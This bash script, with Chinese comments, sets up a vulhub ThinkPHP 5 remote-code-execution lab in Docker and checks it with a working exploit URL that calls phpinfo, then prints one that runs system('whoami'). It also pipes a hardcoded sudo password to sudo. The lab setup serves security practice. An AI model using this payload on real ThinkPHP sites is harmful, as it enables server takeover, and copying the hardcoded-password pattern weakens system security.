#!/bin/bash
# 单独快速启 ThinkPHP 5 RCE
export KALI_PASS="kail"
echo "$KALI_PASS" | sudo -S -v -p "" 2>/dev/null
SUDO="sudo"

cd ~/vulhub/thinkphp/5-rce
$SUDO docker-compose down 2>/dev/null

# 直接重写 docker-compose.yml（用 8081 端口，避免 sed 格式坑）
echo "[*] 重写 docker-compose.yml（固定端口 8081）"
$SUDO tee docker-compose.yml >/dev/null <<'EOF'
version: '2'
services:
  web:
    image: vulhub/thinkphp:5.0.20
    container_name: vulhub-thinkphp-5rce
    ports:
      - "8081:80"
    volumes:
      - ./www:/var/www/html
EOF
cat docker-compose.yml

echo ""
echo "[*] up -d ..."
$SUDO docker-compose up -d 2>&1 | tail -10
sleep 15
echo ""
$SUDO docker ps --format "{{.Names}}   {{.Image}}   {{.Ports}}" | grep think

echo ""
echo "[*] POC 验证：ThinkPHP 5 RCE phpinfo 执行"
for i in 1 2 3 4 5 6 7 8; do
  ROOT=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 http://127.0.0.1:8081/ 2>&1 || echo 000)
  RCE=$(curl -sS --max-time 15 "http://127.0.0.1:8081/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" 2>&1 | head -c 400)
  SZ=${#RCE}
  PHPV=""
  [ $SZ -gt 100 ] && PHPV=$(echo "$RCE" | grep -oE "PHP Version [0-9]+\.[0-9]+\.[0-9]+" | head -1)
  echo "  试 $i:  / HTTP $ROOT   phpinfo_poc $SZ bytes   $PHPV"
  if [ -n "$PHPV" ]; then echo ""; echo "✅✅✅ ThinkPHP 5 RCE 靶场正常工作！POC 返回 $PHPV"; break; fi
  sleep 10
done

echo ""
echo "宿主机访问：  http://192.168.108.128:8081/"
echo "RCE POC：     http://192.168.108.128:8081/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami"
echo "DONE."
